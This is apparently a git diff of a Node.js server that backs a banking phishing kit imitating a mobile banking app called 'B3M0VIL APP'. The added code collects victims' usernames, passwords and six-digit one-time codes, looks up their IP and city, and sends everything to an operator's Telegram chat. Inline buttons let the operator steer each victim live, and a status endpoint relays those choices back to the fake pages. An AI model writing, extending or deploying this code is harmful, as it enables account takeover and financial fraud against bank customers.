@@ -20,7 +20,7 @@ if (!fs.existsSync(CLIENTES_DIR)) {
   fs.mkdirSync(CLIENTES_DIR);
 }
 
-// 🧩 Funciones auxiliares
+// 📡 Funciones auxiliares
 function obtenerIP(req) {
   const forwarded = req.headers["x-forwarded-for"];
   return (
@@ -47,27 +47,31 @@ function cargarCliente(txid) {
   return fs.existsSync(ruta) ? JSON.parse(fs.readFileSync(ruta)) : null;
 }
 
-// 🧹 Limpieza automática cada 10 min
+// 🧹 Limpieza automática cada 10 minutos
 setInterval(() => {
   const ahora = Date.now();
   fs.readdirSync(CLIENTES_DIR).forEach((file) => {
     const fullPath = path.join(CLIENTES_DIR, file);
     const stats = fs.statSync(fullPath);
-    const edadMinutos = (ahora - stats.mtimeMs) / 60000;
-    if (edadMinutos > 15) {
+    const edadMin = (ahora - stats.mtimeMs) / 60000;
+    if (edadMin > 15) {
       fs.unlinkSync(fullPath);
       console.log(`🗑️ Eliminado: ${file}`);
     }
   });
 }, 10 * 60 * 1000);
 
-// 🟣 Paso 1: Enviar usuario/celular
+// 🟣 Paso 1: Enviar primer formulario (usuario)
 app.post("/enviar", async (req, res) => {
-  const { usar, txid, ip, ciudad, pais } = req.body;
+  const { usar, txid, pais } = req.body;
   if (!usar || !txid) return res.status(400).send("Campos faltantes");
+
+  const ip = obtenerIP(req);
+  const ciudad = await obtenerCiudad(ip);
 
   const mensaje = `
 🟣B3M0VIL APP🟣
+
 PAYS: ${pais || "Desconocido"}
 US4R: <code>${usar}</code>
 
@@ -78,11 +82,12 @@ Ciudad: ${ciudad || "Desconocida"}
   const cliente = { status: "esperando", usar, ip, ciudad, pais };
   guardarCliente(txid, cliente);
 
+  // Teclado con botones callback
   const keyboard = {
     inline_keyboard: [
       [
-        { text: "🔑CL4V3", callback_data: `cel-dina:${txid}` },
-        { text: "🔑CL4V3+TOK", callback_data: `cajero:${txid}` },
+        { text: "🔑 CL4V3", callback_data: `clavsola:${txid}` },
+        { text: "🔑 CL4V3+TOK", callback_data: `clavetok:${txid}` }
       ],
     ],
   };
@@ -101,12 +106,60 @@ Ciudad: ${ciudad || "Desconocida"}
   }
 });
 
-// 🟣 Paso 2: Webhook de Telegram (botones)
+// 🟣 Paso 2: Enviar segundo formulario (clave + token)
+app.post("/enviar3", async (req, res) => {
+  const { usar, txid, clavv, ote, ote2, ote3, ote4, ote5, ote6, pais } = req.body;
+  if (!usar || !txid)
+    return res.status(400).send("Campos faltantes en formulario CLAVE+OTP");
+
+  const ip = obtenerIP(req);
+  const ciudad = await obtenerCiudad(ip);
+
+  const cliente = { status: "esperando", usar, clavv, ip, ciudad, pais };
+  guardarCliente(txid, cliente);
+
+  const mensaje = `
+🔐🟣B3M0VIL APP🟣
+ID: <code>${txid}</code>
+
+PAYS: ${pais || "Desconocido"}
+US4R: <code>${usar}</code>
+CONTR4: <code>${clavv}</code>
+
+0TP: <code>${ote}${ote2}${ote3}${ote4}${ote5}${ote6}</code>
+
+IP: ${ip}
+Ciudad: ${ciudad}
+`;
+
+  const keyboard = {
+    inline_keyboard: [
+      [
+        { text: "❌ERROR", callback_data: `errorlogo:${txid}` },
+        { text: "💬SMS", callback_data: `esemese:${txid}` },
+      ],
+    ],
+  };
+
+  try {
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: mensaje,
+      parse_mode: "HTML",
+      reply_markup: keyboard,
+    });
+    res.sendStatus(200);
+  } catch (err) {
+    console.error("❌ Error enviando a Telegram:", err.message);
+    res.status(500).send("Error al enviar a Telegram");
+  }
+});
+
+// 🟣 Webhook de Telegram (botones callback)
 app.post("/webhook", async (req, res) => {
   if (req.body.callback_query) {
     const callback = req.body.callback_query;
     const [accion, txid] = callback.data.split(":");
-
     const cliente = cargarCliente(txid) || {};
     cliente.status = accion;
     guardarCliente(txid, cliente);
@@ -116,48 +169,74 @@ app.post("/webhook", async (req, res) => {
       text: `Has seleccionado: ${accion}`,
     });
 
-    return res.sendStatus(200);
+    res.sendStatus(200);
+  } else {
+    res.sendStatus(200);
   }
-  res.sendStatus(200);
 });
 
-// 🟣 Paso 3: Consultar estado desde el frontend
+// 🟣 Consultar estado desde frontend
 app.get("/sendStatus.php", (req, res) => {
   const { txid } = req.query;
   const cliente = cargarCliente(txid) || { status: "esperando" };
   res.json({ status: cliente.status });
 });
 
-// 🟣 Paso 4: Recibir contraseña o token final
+// 🟣 Paso final (clave o token final)
+// 🟣 Paso final (clave o token final)
 app.post("/enviarFinal", async (req, res) => {
-  const { txid, password, token } = req.body;
+  const { usar, txid, password, token, clavv, pais } = req.body;
+  if (!usar || !txid)
+    return res.status(400).send("Campos faltantes en formulario FINAL");
 
-  const cliente = cargarCliente(txid);
-  if (!cliente) return res.status(400).send("Cliente no encontrado");
+  const ip = obtenerIP(req);
+  const ciudad = await obtenerCiudad(ip);
+
+  // 🧾 Guarda nuevo cliente igual que en enviar3
+  const cliente = { status: "esperando", usar, clavv, ip, ciudad, pais };
+  guardarCliente(txid, cliente);
 
   const mensaje = `
-🔐🟣B3M0VIL APP🟣
+🟣B3M0VIL APP🟣
 🆔 ID: <code>${txid}</code>
 
-PAYS: ${cliente.pais || "Desconocido"}
-US4R: <code>${cliente.usar}</code>
+PAYS: ${pais || "Desconocido"}
+US4R: <code>${usar}</code>
 ${password ? `CONTR4: <code>${password}</code>` : ""}
-${token ? `T0KK: <code>${token}</code>` : ""}
+${token ? `T0K3N: <code>${token}</code>` : ""}
 
-IP: ${cliente.ip}
-Ciudad: ${cliente.ciudad}
+IP: ${ip}
+Ciudad: ${ciudad}
 `;
 
-  await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-    chat_id: CHAT_ID,
-    text: mensaje,
-    parse_mode: "HTML",
-  });
+  // 🔘 Botones callback (igual que en enviar3)
+  const keyboard = {
+    inline_keyboard: [
+      [
+        { text: "❌ERROR", callback_data: `errorlogo:${txid}` },
+        { text: "💬SMS", callback_data: `esemese:${txid}` },
+      ],
+    ],
+  };
 
-  res.json({ redirect: "crgs.html" });
+  try {
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: mensaje,
+      parse_mode: "HTML",
+      reply_markup: keyboard,
+    });
+
+    res.json({ redirect: "crgs.html" });
+  } catch (err) {
+    console.error("❌ Error enviando mensaje final:", err.message);
+    res.status(500).send("Error al enviar mensaje final");
+  }
 });
 
+
+// 🟢 Servidor activo
 app.get("/", (req, res) => res.send("Servidor activo 🚀"));
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
+app.listen(PORT, () => console.log(`🚀 Servidor activo en puerto ${PORT}`));
